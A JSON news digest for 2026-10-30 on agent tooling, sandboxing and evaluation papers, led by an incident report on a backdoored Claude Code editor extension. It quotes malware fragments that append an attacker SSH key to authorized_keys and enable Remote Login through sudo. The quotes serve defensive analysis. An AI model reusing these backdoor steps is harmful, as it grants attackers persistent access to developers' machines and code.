@@ -1,0 +1,644 @@
+{
+  "date": "2026-10-30",
+  "generated_at": "2026-10-30T20:40:59.132569Z",
+  "title": "Supply-Chain Backdoors, Agent Sandboxing, and Synthetic Enterprise Evals",
+  "intro": "Today's digest is headlined by an active supply-chain compromise targeting developers using Claude Code in Cursor, followed by NVIDIA's architectural blueprint for sandboxing open agent harnesses. We also look at Microsoft's synthetic tenant pipeline for privacy-safe Copilot evaluation, though a stubborn bot-protection wall kept several daily benchmark papers out of reach.",
+  "stories": [
+    {
+      "headline": "Backdoor discovered in Claude Code extension on Cursor Marketplace",
+      "summary": "Security firm Phorion identified a persistent SSH backdoor injected into the official `Claude Code for VS Code` extension bundle (version 2.1.313) hosted on the Cursor Marketplace. The injected IIFE prepended to `extension.js` runs immediately upon module load, writing an attacker Ed25519 public key labeled `svc-telemetry` to `~/.ssh/authorized_keys` before extension activation occurs. While the script attempts to start background SSH daemons across macOS, Linux, and Windows, execution failed on default macOS and Windows configurations due to flawed privilege checks and hardcoded shell paths. Cursor and related registries have pulled the release, but the incident demonstrates how easily unvetted IDE extensions can bypass agent tool sandboxing and compromise developer environments.",
+      "why_it_matters": "Because developer extensions inherit the full privileges of the user and editor, backdoors in agent tooling provide immediate, unconstrained access to source code and local infrastructure.",
+      "reason": "A critical supply-chain security incident involving a backdoored Claude Code extension inside a popular developer marketplace directly impacts agent tooling safety.",
+      "item": {
+        "key": "phorion.io/blog/offical-claude-code-vsx-compromise",
+        "source": "Hacker News front page",
+        "tags": [
+          "community"
+        ],
+        "title": "Backdoor in Claude Code for VS Code extension on the Cursor Marketplace",
+        "url": "https://phorion.io/blog/offical-claude-code-vsx-compromise/",
+        "discussion_url": "https://news.ycombinator.com/item?id=50300683",
+        "published": "2026-10-30T07:09:12Z",
+        "summary": "Comments",
+        "content": "TL;DR\nPhorion has detected a backdoor in the official Claude Code for VS Code extension bundle on the Cursor Marketplace that drops a persistent SSH backdoor across macOS, Linux, and Windows. This write-up focuses primarily on macOS, where the extension attempts to configure an SSH backdoor and establish persistence.\nOrganisations should immediately review their environments for use of Claude Code for VSCode 2.1.313 and engage incident response where use of the extension is discovered.\nPhorion has discovered a compromise of the official Claude Code for VS Code extension on the Cursor Marketplace, where the backdoored extension bundle contains a persistent Secure Shell (SSH) backdoor. Cursor has removed the associated release from its marketplace, additionally pulling NPM and VSCode versions for 2.1.313 from their relevant registries.\nWhile the implant includes setup and persistence logic for macOS, Linux, and Windows, we’re going to focus primarily on macOS in this post, calling out the key differences and a few implementation bugs on the other platforms along the way.\nThe Cursor Marketplace serves extensions for the Cursor editor. Because extensions run with the permissions of the IDE and the user running it, a backdoored extension gets immediate access to local files, source code, and developer tooling as soon as its module is loaded.\nNotably, Phorion has discovered a likely oversight in how the malware tries to turn on SSH. The setup logic assumes it can check the current Remote Login state without root privileges. When run as a standard user, systemsetup -getremotelogin prints an administrator-access error and exits with status 0 instead of returning Off. Because the script only tries to enable SSH if the output matches Off, it skips the enablement step entirely. On a Mac that doesn’t already have SSH running, that mistake breaks the inbound access path, even though the SSH keys and persistence still get dropped.\nIn this post, we’ll walk through how the backdoor works, why that macOS check fails, and what to look for across your fleet. The goal of this payload is long-term interactive access, and whilst the SSH backdoor bug minimises impact on macOS, the malware is still a significant threat that installs persistence and beacons host reconnaissance back to the operator.\nInfection Chain\nThe Cursor Marketplace Extension\nThe compromised extension.js file starts with an injected immediately invoked function expression (IIFE) prepended to the minified extension bundle. The rest of the bundle looks like the standard extension, with Claude Code and VS Code strings, normal activate and deactivate exports, and UI code.\nThe injected prefix pulls in standard Node.js modules (child_process, fs, os, path, http, and crypto) and executes as soon as Node loads the file, before the extension’s normal activate callback even runs. The user doesn’t need to interact with the extension for the payload to fire.\nStage 1 - Preparing SSH Access\nFirst, the payload makes sure ~/.ssh exists and appends an attacker-controlled Ed25519 public key to ~/.ssh/authorized_keys, setting permissions to 0700 on the directory and 0600 on the file.\nThe key uses the comment svc-telemetry. Before appending, the script checks whether svc-telemetry is already in the file rather than checking for the key itself. When hunting for this activity, it’s worth checking the public-key fingerprint rather than relying solely on the comment string.\nvar sd = path.join(HOME, \".ssh\"),\n    ak = path.join(sd, \"authorized_keys\");\n// ...\nif (cur.indexOf(\"svc-telemetry\") < 0) {\n  fs.appendFileSync(ak, PUB + \"\\n\");\n  d.sshKey = \"added\"\n} else {\n  d.sshKey = \"present\"\n}\nHere, cur holds the existing contents of authorized_keys, and PUB is the embedded attacker public key (redacted here).\nWith the key in place, anyone holding the matching private key can authenticate as that user, provided SSH is actually running. The next step in the script tries to make sure the local SSH daemon is enabled and listening:\n- Linux: tries to enable and start sshd or ssh via systemctl, falling back to service and /etc/init.d/.\n- macOS: checks Remote Login and, if it reports Off, tries to enable it via sudo -n systemsetup -setremotelogin on.\n- Windows: tries to install and start OpenSSH Server using PowerShell.\nNone of these steps include a privilege escalation exploit. Non-interactive sudo -n will fail unless the user already has passwordless sudo cached or configured, so starting a system service won’t always succeed from a standard user context.\nIt looks like the Windows code path also has its own bug: it passes the PowerShell service setup command through a helper function (det()) that hardcodes /bin/sh, which isn’t going to get very far on a standard Windows install.\nA bug in the macOS SSH logic?\nOn macOS, the setup may run into problems before it even gets to the sudo command. The script runs systemsetup -getremotelogin without elevation and tests the output against /Off/i. It only tries to enable Remote Login if the output contains Off:\n// ...\nelse if (PLAT === \"darwin\") {\n  var rl = ex(\"systemsetup -getremotelogin 2>/dev/null\", 4000);\n  d.remoteLogin = rl;\n  if (/Off/i.test(rl)) {\n    det(\"sudo -n systemsetup -setremotelogin on >/dev/null 2>&1\");\n    d.remoteLoginOn = \"tried\"\n  }\n}\nNotice that the second command (-setremotelogin on) uses sudo -n, while the first command (-getremotelogin) doesn’t. When you run systemsetup -getremotelogin as a standard user on macOS, you get this instead:\nYou need administrator access to run this tool... exiting!\nsystemsetup refuses to read the setting without administrator privileges, prints the error to stdout, and exits with status 0. The malware’s ex() helper grabs stdout and returns it:\nfunction ex(c, t) {\n  try {\n    return cp.execSync(c, {\n      timeout: t || 3000,\n      stdio: [\"ignore\", \"pipe\", \"ignore\"],\n      windowsHide: true\n    }).toString().trim()\n  } catch (e) {\n    return \"\"\n  }\n}\nBecause the output is \"You need…",
+        "score": null,
+        "comments": null,
+        "also_in": []
+      },
+      "related": []
+    },
+    {
+      "headline": "Benchmark difficulty formalization hits a verification barrier",
+      "summary": "This paper sets out to formalize benchmark evaluations through a measure-theoretic framework over task difficulty distributions. Unfortunately, technical details are unavailable because the source page presented an automated anti-bot verification screen instead of the paper text. Without raw access to the mathematical formulation or empirical results, the specific failure modes identified remain unverified.",
+      "why_it_matters": "A formal mathematical framework for model difficulty distributions could fix major flaws in how LLM judges and benchmarks measure frontier agents, once readable.",
+      "reason": "Formalizes a measure-theoretic foundation for benchmark evaluation, revealing two structural mathematical failure modes in how model difficulty distributions are currently measured.",
+      "item": {
+        "key": "arxiv:2610.29927",
+        "source": "HF Daily Papers",
+        "tags": [
+          "research"
+        ],
+        "title": "Your Benchmark Is an Empirical Measure Over Difficulty",
+        "url": "https://huggingface.co/papers/2610.29927",
+        "discussion_url": null,
+        "published": "2026-10-30T00:00:00Z",
+        "summary": "A benchmark is not merely a collection of test questions; it naturally induces an empirical measure over difficulty. In this work, we develop this measure-based view of benchmark evaluation. This perspective allows us to identify and formalize two central failure modes: measure mismatch, where the benchmark difficulty distribution differs from the intended difficulty distribution, and coverage gaps, where uncovered regions along the difficulty axis prevent benchmarks from detecting meaningful localized training progress. We propose two diagnostic metrics that capture these two failure modes and provide rigorous theoretical guarantees. Empirically, we analyze 25 popular benchmarks spanning 7 domains using carefully estimated item difficulties. Our results show that many benchmarks implicitly overweight certain difficulty regions, so their leaderboard conclusions should be interpreted with caution; others leave substantial portions of the difficulty axis uncovered, limiting their ability to monitor the model improvement process. Finally, we turn diagnosis into action by introducing BenchFill, a simple difficulty-targeted item rewriting algorithm that effectively reduces local…",
+        "content": "JavaScript is disabled\nIn order to continue, we need to verify that you're not a robot. This requires JavaScript. Enable JavaScript and then reload the page.",
+        "score": 141.0,
+        "comments": 2,
+        "also_in": []
+      },
+      "related": []
+    },
+    {
+      "headline": "NVIDIA NemoClaw packages open harnesses with OpenShell governance",
+      "summary": "NVIDIA introduced NemoClaw, an open blueprint stack that integrates existing agent harnesses—including Hermes Agent, LangChain Deep Agents, and OpenClaw—with Nemotron models and runtime governance. Rather than inventing another orchestration framework, the stack layers pre-tuned harness configurations alongside `OpenShell`, an execution sandbox that isolates credentials (such as MCP keys) and enforces filesystem and network policies. NVIDIA notes that tuning LangChain Deep Agents specifically for Nemotron 3 Ultra brought performance near frontier baselines at roughly one-tenth the inference cost of closed models. For production agent builders, separating orchestration logic from a dedicated policy-enforcing runtime like OpenShell is becoming table stakes.",
+      "why_it_matters": "It establishes a concrete pattern for wrapping third-party harnesses and MCP connections in strict, policy-driven security perimeters without rewriting agent logic.",
+      "reason": "Introduces NemoClaw, an agent runtime and execution harness designed to enforce strict security boundaries and tool constraints for enterprise agent deployments.",
+      "item": {
+        "key": "developer.nvidia.com/blog/build-specialized-agents-on-a-stack-you-control-with-nvidia-nemoclaw",
+        "source": "NVIDIA Developer",
+        "tags": [
+          "infra"
+        ],
+        "title": "Build Specialized Agents on a Stack You Control with NVIDIA NemoClaw",
+        "url": "https://developer.nvidia.com/blog/build-specialized-agents-on-a-stack-you-control-with-nvidia-nemoclaw/",
+        "discussion_url": null,
+        "published": "2026-10-30T16:00:00Z",
+        "summary": "Building an autonomous agent requires a model, a harness, and domain-specific tools. To deploy an agent more securely, developers need a runtime that enforces...",
+        "content": "Building an autonomous agent requires a model, a harness, and domain-specific tools. To deploy an agent more securely, developers need a runtime that enforces policies, along with optimization and observability tools for reliable execution.\nFor production agents, the challenge lies in making these agents capable and safe to operate with access to real enterprise systems and data.\nThis post explains how these components work together, with a focus on how NVIDIA NemoClaw open blueprints enable developers to build specialized agents on a stack they can own, customize, and run. This post provides criteria to help developers integrate NemoClaw with a harness they already use: OpenClaw, Hermes Agent, or LangChain Deep Agents.\nWhat an agent harness provides\nAn agent requires four things:\n- A model that reasons.\n- A harness that defines how the agent operates.\n- Tools and skills that extend its capabilities.\n- A runtime that governs what the agent can access and do in production.\nNemoClaw works with agent harnesses\nNemoClaw open blueprints currently support three harnesses:\n- OpenClaw can access files and applications, write code, spawn sub-agents, and maintain context across sessions. It runs on your own machine or server and supports long-running sessions, memory, and scheduled tasks.\n- Hermes Agent, from Nous Research, is designed to get better with use. As teams correct the agents’ approach and repeat workflows, Hermes captures those patterns as durable skills that can be reused in future work.\n- LangChain Deep Agents provides a customizable harness for complex, multistep tasks. It combines planning, file-based context management, memory, and delegation to specialized subagents.\nEach harness gives an agent skills, tools, orchestration, and memory.\nUsing NemoClaw for full-stack production agents\nNemoClaw is not a competing harness, and it is not a runtime. It is a collection of blueprints that assembles an open agent stack on top of the harness selected by the developer. The stack combines model and harness optimization with runtime governance.\nEach NemoClaw blueprint brings together four components:\n- A tuned open harness, such as Hermes Agent, LangChain Deep Agents, or OpenClaw, optimized to work with NVIDIA Nemotron.\n- Nemotron open models.\n- NVIDIA NeMo tools for optimization, including NVIDIA NeMo Relay for observing and improving agent execution, plus routing capabilities that can help improve throughput, cost, and reliability.\n- NVIDIA OpenShell is the secure runtime that governs agent access to files, networks, credentials, and tools.\nIf you are already building with OpenClaw, Hermes Agent, or LangChain Deep Agents, a NemoClaw blueprint can assemble the surrounding stack without requiring you to rewrite the agent.\nWhy co-optimizing the model and harness matters\nAn agent combines a model and a harness. The model thinks, while the harness provides the environment in which it operates. When the two are matched, the model can focus on the task. When they aren’t, it may ask for context again, stop early, or loop without progress.\nFor example, LangChain tuned its Deep Agents harness for Nemotron 3 Ultra by adjusting prompts, tools, and middleware without retraining the model. Starting from an already strong baseline, the harness tuning brought Nemotron 3 Ultra to near-frontier performance at approximately 10x lower cost per run compared with leading closed models.\nThe NemoClaw blueprint for LangChain Deep Agents packages these optimizations directly. Every developer using LangChain Deep Agents with Nemotron 3 Ultra can access these optimizations without reproducing the tuning work. The tuned Nemotron 3 Ultra model profile is available through LangChain on GitHub.\nWhen to use each\nUse a harness such as OpenClaw, Hermes Agent, or LangChain Deep Agents to build and experiment with the agent’s skills, tools, memory, and orchestration logic.\nUse a NemoClaw blueprint to assemble and run a specialized agent on an open stack that combines a tuned harness, models, optimization, telemetry, and OpenShell runtime controls.\nA harness helps you build a capable agent. A NemoClaw blueprint helps you run that agent on an open stack with model and harness optimization, telemetry, and runtime governance.\nExample: A memory-driven Chief of Staff, built on Hermes\nThe NemoClaw community repository includes a memory-driven Chief of Staff recipe. The agent maintains a persistent, human-readable model of the people, projects, priorities, and working patterns it encounters, so it doesn’t have to reconstruct context from scratch on every task. It is built as a deployable Hermes profile for NemoClaw, as outlined in the technical design walkthrough.\nThe recipe shows the stack working together rather than in isolation. OpenShell governs the agent’s file system, process, and network access, and keeps credentials for managed inference and Model Context Protocol (MCP) connections outside the sandbox. This helps keep the agent bound by policy even when its memory or retrieved context leads it toward an unintended action. NeMo Relay is integrated natively into the Hermes session. It closes trace spans at real session boundaries, including a new session, reset, or expiry, and exports the resulting trajectories for audit and further optimization.\nImportance of agent governance\nEvery NemoClaw reference includes OpenShell, the runtime that adds security and policy enforcement around the agent harness and tools, governing the actions a model can take. The OpenShell tutorial covers how to create your first policy to prevent data exfiltration to GitHub. NemoClaw references include more sophisticated OpenShell policies that govern agent connections across many different internal tools, sites, and communication channels.\nDeploy across cloud, data center, and local systems\nNemoClaw agents can run in the cloud, in data centers, on NVIDIA DGX Spark, and on NVIDIA RTX PCs and workstations. A NemoClaw clinical agent for a hospital and a…",
+        "score": null,
+        "comments": null,
+        "also_in": []
+      },
+      "related": []
+    },
+    {
+      "headline": "PersonaCUABench benchmarks computer-use agents against varied user personas",
+      "summary": "PersonaCUABench proposes an evaluation suite for computer-use agents handling underspecified instructions and unstated approval gates across varied user personas. However, the publication page was blocked by an automated bot verification check, leaving the specific task suites and evaluation methodologies inaccessible in the source text. Details remain sparse until the paper text can be properly ingested.",
+      "why_it_matters": "Benchmarking how desktop agents handle ambiguous human intent and missing permission boundaries is essential for deploying reliable computer-use agents.",
+      "reason": "Establishes an evaluation benchmark for computer-use agents that tests how models handle underspecified instructions and unstated approval gates across varied user personas.",
+      "item": {
+        "key": "arxiv:2610.22990",
+        "source": "HF Daily Papers",
+        "tags": [
+          "research"
+        ],
+        "title": "PersonaCUABench: Benchmarking Computer-Use Agents Serving Diverse Personas",
+        "url": "https://huggingface.co/papers/2610.22990",
+        "discussion_url": null,
+        "published": "2026-10-29T00:00:00Z",
+        "summary": "Computer-use agents (CUAs) are commonly evaluated against fixed task specifications, but users may omit requirements, add constraints, or require approval before consequential actions. Completing the benchmark instruction does not guarantee serving the person who asked. We introduce PersonaCUABench, which holds 74 tasks across 11 domains fixed and varies only who asks. A persona agent, playing one of 44 personas in four groups, rewrites each instruction in that user's own words and answers the CUA's questions, while the CUA sees only the dialogue, never the profile or the original instruction. Across nine backbones (3,330 runs), mean task completion falls by 36% relative to the original requests. The losses have two sources: in 59.9% of cells that lose points, the agent engages with what the user asked for and still gets it wrong, and 11.2% are stops the user requested that the checker scores as failures. Even when a persona request is fully completed, the user gives the top satisfaction rating in only 62.7% of cells, against 84.1% for the original requests. CUAs should therefore be evaluated not only on task completion but also on whether they meet the requirements and…",
+        "content": "JavaScript is disabled\nIn order to continue, we need to verify that you're not a robot. This requires JavaScript. Enable JavaScript and then reload the page.",
+        "score": 15.0,
+        "comments": 1,
+        "also_in": []
+      },
+      "related": []
+    },
+    {
+      "headline": "WebAnything aims to turn live websites into reproducible agent sandboxes",
+      "summary": "WebAnything attempts to tackle agent web navigation by converting arbitrary live websites into reproducible, resettable sandbox environments for training and evaluation. Specifics regarding its capture-and-replay engine and environment resets could not be confirmed because the host site returned a JavaScript robot challenge. Practical details on sandbox fidelity and state isolation are consequently unavailable.",
+      "why_it_matters": "Standardized capture-and-replay systems for live web targets are critical for evaluating browser agents without risking side effects on real web services.",
+      "reason": "Presents an automated capture-and-replay system that turns arbitrary live websites into reproducible, resettable sandbox environments for agent training and evaluation.",
+      "item": {
+        "key": "arxiv:2610.37786",
+        "source": "HF Daily Papers",
+        "tags": [
+          "research"
+        ],
+        "title": "WebAnything: From the Wild Web to Scalable Agent Environments",
+        "url": "https://huggingface.co/papers/2610.37786",
+        "discussion_url": null,
+        "published": "2026-10-30T00:00:00Z",
+        "summary": "Web agents require diverse, executable, and resettable website environments for reproducible training and evaluation. Human-assisted mirrors demand per-site engineering, while generative construction can diverge from specified real websites. Capture-and-replay preserves observations, with interaction coverage constrained by captured content and replay capabilities.\n  We present WebAnything, a fully automated framework that reconstructs source-grounded, reusable Web environments from real URLs without per-site manual implementation or repair after initial setup and authorization. An Explorer-Builder collects browser-observable structures, resources, and interaction outcomes; an independent verifier checks frozen candidates and guides local repair or targeted source recapture.\n  We construct 244 website artifacts across 14 application domains and 53 categories, supporting 12,984 executed and accepted tasks. Compared with human-assisted WebHarbor, WebAnything achieves higher aggregate scores on three fidelity metrics, with 12 wins, two ties, and no losses in a blind audit. Fine-tuning Qwen3.5-9B on 5,856 interaction trajectories improves REAL success by 9.9 percentage points…",
+        "content": "JavaScript is disabled\nIn order to continue, we need to verify that you're not a robot. This requires JavaScript. Enable JavaScript and then reload the page.",
+        "score": 11.0,
+        "comments": 1,
+        "also_in": []
+      },
+      "related": []
+    },
+    {
+      "headline": "Microsoft evaluates Copilot on fully synthetic enterprise tenants",
+      "summary": "Microsoft Research detailed its Industry Evaluation Data Generation Platform, designed to benchmark Microsoft Copilot across realistic enterprise workflows without touching private customer data. The platform generates dynamic, time-evolving synthetic enterprise environments ('tenants') grounded in public data from the U.S. Department of Labor's O*NET database, online job postings, and SEC filings. By simulating cross-functional communication histories, reporting hierarchies, and project timelines across industries like pharmaceuticals and capital markets, Microsoft can evaluate time-dependent queries like project updates against structured baselines. It offers a viable template for agent developers needing complex, temporally grounded organizational data to test retrieval and summarization without privacy liabilities.",
+      "why_it_matters": "Evaluating enterprise agents against dynamic, multi-turn organizational histories requires high-fidelity synthetic environments that avoid data privacy exposure.",
+      "reason": "Explores evaluation methodology for enterprise Copilot agents using high-fidelity synthetic organizational data to safely benchmark performance without data privacy leaks.",
+      "item": {
+        "key": "microsoft.com/en-us/research/blog/from-synthetic-enterprise-data-evaluations-to-real-microsoft-copilot-ai-confidence",
+        "source": "Microsoft Research",
+        "tags": [
+          "lab",
+          "research"
+        ],
+        "title": "From synthetic enterprise data evaluations to real Microsoft Copilot AI confidence",
+        "url": "https://www.microsoft.com/en-us/research/blog/from-synthetic-enterprise-data-evaluations-to-real-microsoft-copilot-ai-confidence/",
+        "discussion_url": null,
+        "published": "2026-10-30T13:05:28Z",
+        "summary": "Evaluating Microsoft Copilot at enterprise scale requires test data that captures the full complexity of real organizations, yet real enterprise data contains sensitive information that cannot be used for evaluation under any circumstances.\n\nThe post From synthetic enterprise data evaluations to real Microsoft Copilot AI confidence appeared first on Microsoft Research .",
+        "content": "At a glance\n\nEvaluating Microsoft Copilot at enterprise scale requires test data that captures the full complexity of real organizations, yet real enterprise data contains sensitive information that cannot be used for evaluation under any circumstances.\n\nTo resolve this tension, we built Industry Evaluation Data Generation Platform: full-scale synthetic enterprise environments grounded in publicly available real-world data sources such as O*NET occupational data, online job postings, and SEC filings.\n\nThe synthetic environments mimic real business workflows, helping Microsoft find issues that generic benchmarks would miss.\n\nSafety and privacy are built into the platform by design. Every environment is fully synthetic and automated content-safety checks keep the generated data free of harmful or personally identifiable material.\n\nEvery day, millions of knowledge workers around the world rely on Microsoft Copilot to draft documents, summarize meetings, surface relevant information, and accelerate productivity. Behind the scenes, this is powered by a network of AI systems, and ensuring they work as intended requires a thoughtful approach to evaluation. At Microsoft, we know that high performance doesn’t come from guesswork. It comes from testing, measuring, and iterating constantly.\n\nHealthcare organizations are constantly synthesizing safety signals from across teams so that they can make faster, better decisions that directly influence patient outcomes and regulatory confidence.\n\nThey may ask Copilot to summarize a meeting and extract action items for their teams. Within seconds, Copilot delivers a structured summary citing specific discussion points from the transcript. But how do we ensure this response is accurate, complete, and properly grounded in the meeting content? This is where our evaluation system comes in.\n\nWe’ve developed a structured evaluation strategy called Industry Evaluation Data Generation Platform , which includes industry specific evaluation datasets designed to test AI systems against realistic enterprise scenarios, grounded in three core pillars:\n\nSynthetic enterprise environments : simulated Microsoft Copilot environments with realistic users, meetings, emails, documents, and organizational structures that replicate the complexity of real organizations without using any customer data\n\nAutomated query generation pipelines for rapid, reproducible creation of evaluation datasets\n\nStructured quality frameworks to ensure synthetic data meets the bar for meaningful evaluation\n\nFigure 1: Components of Industry Evaluation Data Generation Platform\n\nTogether, these pillars help us answer two fundamental questions: Is Microsoft Copilot actually doing what our users need it to do, and can we prove it without ever touching their data ?\n\nIn this blog post, we’ll walk through our evaluation system and processes, from synthetic environment generation to automated query pipelines, and how it all comes together to establish the first standardized evaluation baseline for Microsoft Copilot.\n\nSynthetic enterprise environments\n\nEvaluating enterprise AI requires test data that captures the full complexity of real organizations: reporting structures, project histories, communication patterns, and domain specific workflows. But real enterprise data contains sensitive information that cannot be used for evaluation under any circumstances. This is the central tension we set out to resolve.\n\nRather than relying on small, manually curated test fixtures, we generate full scale synthetic environments : simulated enterprise workspaces, each with realistic organizational structures, communication histories, and work artifacts. In Microsoft terminology, each of these simulated workspaces is called a “tenant”. A tenant is an isolated organizational environment with its own users, data, and configurations. These environments are scalable baselines that teams and organizations can build off of however they want. They are designed to exhibit the same structural and behavioral properties that make enterprise AI evaluation meaningful.\n\nGrounding in real world signals\n\nTo ensure our synthetic environments are realistic, we grounded them in publicly available real world data sources.\n\nO*NET data from the U.S. Department of Labor’s occupational database was used to make synthetic employee roles and responsibilities realistic, calibrate the mix and frequency of work activities assigned to different roles, and tailor industry specific workflows such as clinical trial reviews or portfolio updates.\n\nOnline job postings provide realistic role titles, reporting hierarchies, and departmental compositions.\n\nSEC filings inform organizational scale, business unit structures, and financial contexts. All of these sources are publicly available and have been reviewed and approved by Microsoft’s legal and policy organization.\n\nFigure 2: Real signals from public datasets that are used to ground the evaluation data generation\n\nImportantly, these synthetic environments are not static snapshots. They simulate dynamic, time-evolving organizations with meeting histories, project timelines, email threads that develop over weeks, and organizational changes that unfold naturally. This temporal dimension is essential because a large class of Copilot queries are inherently time aware. Questions like “What did the team decide last Thursday?” or “What’s changed since the last quarterly review?” only produce meaningful evaluations if the underlying data has a genuine temporal structure.\n\nIndustry specific simulation\n\nWe generated three synthetic environments across multiple industries, each with distinct characteristics that mirror real world usage:\n\nA pharmaceutical environment that includes regulatory submission workflows, clinical trial discussions, and cross functional safety review meetings\n\nA capital markets environment featuring deal pipelines, compliance communications, and client portfolio reviews\n\nAn IT/software company that simulates sprint planning, code review discussions, and product launch coordination\n\nFigure 3: Industries targeted for industry evaluation data generation\n\nThis industry specificity ensures that our evaluation queries test Copilot against the kinds of questions real users in those domains actually ask, rather than relying on generic test cases that may not surface domain specific failure modes.\n\nAutomated query generation\n\nWhile synthetic environments provide the substrate for evaluation, they face a key limitation: we still need realistic evaluation queries. These are the questions that test whether Copilot can surface the right information, synthesize it correctly, and present it helpfully. Manually writing thousands of grounded, industry specific queries is prohibitively expensive and slow. That’s where our automated pipeline comes in.\n\nThe six-stage pipeline\n\nFigure 4: Query customization pipeline that turns generic query templates into realistic, industry-specific queries\n\nWe built an automated pipeline that turns simple, generic query ideas into realistic, industry-specific questions for Copilot. It starts with a large library of common workplace tasks, narrows them down to what’s relevant for a given industry, and adapts them using domain-specific language and context. The system then uses AI to generate queries grounded in the synthetic environment’s data, rewrites them to sound more natural and human, and validates each one for accuracy and uniqueness. The result is a rich set of high-quality, lifelike queries that enable scalable and reliable evaluation of Copilot across real-world scenarios.\n\nValidating synthetic quality\n\nOf course, generating synthetic data is only part of the challenge. We also need to ensure the data is good enough to produce meaningful evaluations. We assess synthetic environment quality using our internal semantic evaluation framework which measures quality across three dimensions:\n\nStructural fidelity : Does the organizational…",
+        "score": null,
+        "comments": null,
+        "also_in": []
+      },
+      "related": []
+    },
+    {
+      "headline": "Co-Design Bench evaluates multimodal coding agents on UI revisions",
+      "summary": "Co-Design Bench introduces an evaluation benchmark tailored for multimodal coding agents tasked with converting visual feedback and UI mockups into functional code revisions. Further technical analysis is precluded because the source text was obscured behind an anti-bot verification screen. Specific metrics, reference-free evaluation details, and baseline scores are not present in the available material.",
+      "why_it_matters": "Evaluating how coding agents interpret visual UI feedback directly addresses the gap between raw code completion and end-to-end software development.",
+      "reason": "Introduces a 273-task reference-free benchmark testing whether coding agents can successfully translate multimodal user requests and visual feedback into working software revisions.",
+      "item": {
+        "key": "arxiv:2610.35138",
+        "source": "HF Daily Papers",
+        "tags": [
+          "research"
+        ],
+        "title": "Co-Design Bench: Multimodal Collaborative Coding Evaluation for Agentic Models",
+        "url": "https://huggingface.co/papers/2610.35138",
+        "discussion_url": null,
+        "published": "2026-10-30T00:00:00Z",
+        "summary": "Evaluating human-AI co-design requires testing whether coding agents can translate real users' multimodal requests into working application revisions. We introduce Co-Design Bench, a reference-free benchmark of 273 tasks curated from 37,463 deduplicated queries across 26,314 real user coding sessions. Its two tracks, Multimodal Editing (ME) and Repository Editing (RE), cover localized edits with optional image, audio, video, or document inputs and coordinated repository revisions. Tasks span three capability dimensions: Grounded Understanding, UI Transformation, and Functional Implementation. The tasks pair normalized requests and runnable pre-edit applications with 2,331 hidden expert-authored acceptance criteria. Our judge-then-refute protocol grades criteria using source and browser evidence, challenges positive verdicts with a separate LLM verifier, and audits visual and interaction claims without gold code or target screenshots. Under a shared agentic harness, the strongest of ten model endpoints passes an average of 69.9% of criteria per task but fully satisfies only 26.4% of tasks. All ten endpoints achieve lower criterion completion on repository edits spanning three or…",
+        "content": "JavaScript is disabled\nIn order to continue, we need to verify that you're not a robot. This requires JavaScript. Enable JavaScript and then reload the page.",
+        "score": 19.0,
+        "comments": 1,
+        "also_in": []
+      },
+      "related": []
+    },
+    {
+      "headline": "WorkFactory automates trajectory generation from professional intents",
+      "summary": "WorkFactory addresses agent training bottlenecks by translating ambiguous, high-level professional intents into executable, verifiable demonstration workflows. Technical specifics on the translation pipeline and trajectory verification are unavailable because the source material was restricted by an anti-bot challenge. Concrete architectural details cannot be verified until the paper text is made available.",
+      "why_it_matters": "Automating the synthesis of verifiable, multi-step execution traces from vague user prompts helps resolve the massive data bottleneck in training workflow agents.",
+      "reason": "Addresses a core data bottleneck in agent training by automatically translating ambiguous professional intents into executable, verifiable demonstration workflows.",
+      "item": {
+        "key": "arxiv:2610.37161",
+        "source": "HF Daily Papers",
+        "tags": [
+          "research"
+        ],
+        "title": "WorkFactory: Turning Professional Intents into Executable Work for Scalable Agent Training",
+        "url": "https://huggingface.co/papers/2610.37161",
+        "discussion_url": null,
+        "published": "2026-10-30T00:00:00Z",
+        "summary": "Scaling supervised training for working agents requires diverse professional tasks that yield reliable expert demonstrations. However, missing or inconsistent task information can obstruct teacher execution and weaken the resulting supervision. We propose WorkFactory, a scalable framework for constructing coherent and executable professional tasks. Starting from professional intents, information-level planning builds an information support graph to guide task instantiation, explicitly representing the dependencies and locations of information required for the intended outputs. Probe executions then identify support failures and guide repairs while preserving the intended work. We construct 112,686 tasks spanning 612 occupations and use the collected teacher trajectories to fine-tune Qwen models at 4B, 27B, and 35B-A3B scales, yielding the WorkPilot family. All three models improve over their respective base models across four professional-work benchmarks, with WorkPilot-35B-A3B improving from 879 to 1565 Elo on GDPval-AA v2.1. Scaling analyses reveal model-dependent diminishing returns, with execution length first increasing and then decreasing. Controlled component analyses show…",
+        "content": "JavaScript is disabled\nIn order to continue, we need to verify that you're not a robot. This requires JavaScript. Enable JavaScript and then reload the page.",
+        "score": 30.0,
+        "comments": 3,
+        "also_in": []
+      },
+      "related": []
+    }
+  ],
+  "quick_hits": [
+    {
+      "line": "Epsilon implemented a managed UI testing platform using Amazon Nova Act and Bedrock's AgentCore Browser Tool to run plain-English tests inside AWS-managed browsers.",
+      "item": {
+        "key": "aws.amazon.com/blogs/machine-learning/building-intent-driven-ui-testing-with-amazon-nova-act",
+        "source": "AWS Machine Learning",
+        "tags": [
+          "infra"
+        ],
+        "title": "Building intent-driven UI testing with Amazon Nova Act",
+        "url": "https://aws.amazon.com/blogs/machine-learning/building-intent-driven-ui-testing-with-amazon-nova-act/",
+        "discussion_url": null,
+        "published": "2026-10-29T18:20:27Z",
+        "summary": "Epsilon's Agentic Platform team delivers UI testing as a managed, multi-tenant service built on Amazon Nova Act and Amazon Bedrock AgentCore Browser Tool. Tests are written in plain English and run on browsers managed by AWS, giving every product team resilient, intent-driven testing with zero per-team infrastructure overhead.",
+        "content": "To scale intent-driven UI testing across its product teams, Epsilon , a data, technology, and marketing-services company and part of Publicis Groupe , turned to Amazon Nova Act . With hundreds of millions of consumer profiles and thousands of brand relationships, Epsilon needed UI testing that could keep pace with rapid application changes. The solution could not create maintenance overhead for every product team.\n\nWithin Epsilon, the Agentic Platform team (50 engineers) builds shared infrastructure so other product teams can build, deploy, govern, and run AI agents safely. With this shared platform, teams get a skills-based agent builder. They also get federated identity and pre-flight authorization, Model Context Protocol (MCP) integration, and cross-account provisioning. When a product team wants to adopt AI tooling, they get capabilities without additional configuration and without re-solving identity, security, browser infrastructure, or model integration on their own.\n\nOne of those managed capabilities is UI testing . With Amazon Nova Act and Amazon Bedrock AgentCore Browser (a capability of Amazon Bedrock AgentCore), Epsilon’s platform team could deliver resilient, intent-driven testing as a service to teams on the platform.\n\nIn this post, we walk through Epsilon’s architecture for delivering UI testing as a managed platform service, show the core Nova Act and Amazon Bedrock AgentCore Browser Tool integration code, highlight a concrete 